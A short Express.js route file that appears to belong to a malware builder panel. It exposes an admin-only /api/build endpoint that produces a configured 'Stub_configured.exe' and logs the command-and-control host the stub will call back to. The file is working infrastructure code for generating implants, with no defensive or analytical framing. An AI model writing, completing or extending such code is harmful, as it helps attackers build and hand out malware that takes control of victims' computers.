"use strict";

const express = require("express");
const { requireAdmin } = require("../middleware/auth");
const { buildStubBinary } = require("../controllers/builderController");

const router = express.Router();

router.post("/api/build", requireAdmin, (req, res) => {
  try {
    const out = buildStubBinary(req.body);
    res.setHeader("Content-Type", "application/octet-stream");
    res.setHeader("Content-Disposition", 'attachment; filename="Stub_configured.exe"');
    res.send(out);
    console.log(`[builder] built stub  host=${req.body.c2Host}  size=${out.length}`);
  } catch (e) {
    console.error("[builder] error:", e.message);
    res.status(500).json({ error: e.message });
  }
});

module.exports = router;
